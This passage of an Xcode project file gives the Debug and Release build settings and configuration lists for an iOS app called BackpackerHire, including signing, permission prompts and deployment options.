				CODE_SIGN_ENTITLEMENTS = BackpackerHire.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 9422ZUYF32;
				ENABLE_DEBUG_DYLIB = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				EXCLUDED_ARCHS = "";
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "BackpackerHire-Info.plist";
				INFOPLIST_KEY_NSCameraUsageDescription = "We need access to your camera to take photos or videos.";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "We need your location to show relevant results nearby.";
				INFOPLIST_KEY_NSMicrophoneUsageDescription = "We need access to the microphone for speech input.";
				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app requires permission to save images to your photo library.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to your photo library to let you select and upload photos.";
				INFOPLIST_KEY_NSSpeechRecognitionUsageDescription = "We need access to speech recognition for voice input.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = "HireLaunch Screen.storyboard";
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				OTHER_SWIFT_FLAGS = "$(inherited) -D COCOAPODS -D BackpackerHire";
				PRODUCT_BUNDLE_IDENTIFIER = com.backpackerHire.app;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		75D1DEB12E28D08C005CDFC8 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 2CEE1BAB93270E0498AA06BF /* Pods-BackpackerPods-BackpackerHire.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = EmpAppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				ASSETCATALOG_COMPILER_INCLUDE_ALL_APPICON_ASSETS = YES;
				CODE_SIGN_ENTITLEMENTS = BackpackerHireRelease.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 39725U3KYU;
				ENABLE_DEBUG_DYLIB = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				EXCLUDED_ARCHS = "";
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "BackpackerHire-Info.plist";
				INFOPLIST_KEY_NSCameraUsageDescription = "We need access to your camera to take photos or videos.";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "We need your location to show relevant results nearby.";
				INFOPLIST_KEY_NSMicrophoneUsageDescription = "We need access to the microphone for speech input.";
				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app requires permission to save images to your photo library.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to your photo library to let you select and upload photos.";
				INFOPLIST_KEY_NSSpeechRecognitionUsageDescription = "We need access to speech recognition for voice input.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = "HireLaunch Screen.storyboard";
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				OTHER_SWIFT_FLAGS = "$(inherited) -D COCOAPODS -D BackpackerHire";
				PRODUCT_BUNDLE_IDENTIFIER = com.backpackerHire.app;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		7580D0352E279472000335C8 /* Build configuration list for PBXProject "Backpacker" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				7580D0502E279473000335C8 /* Debug */,
				7580D0512E279473000335C8 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		7580D04D2E279473000335C8 /* Build configuration list for PBXNativeTarget "Backpacker" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				7580D04E2E279473000335C8 /* Debug */,
				7580D04F2E279473000335C8 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		75D1DEAF2E28D08C005CDFC8 /* Build configuration list for PBXNativeTarget "BackpackerHire" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				75D1DEB02E28D08C005CDFC8 /* Debug */,
				75D1DEB12E28D08C005CDFC8 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 7580D0322E279472000335C8 /* Project object */;
}
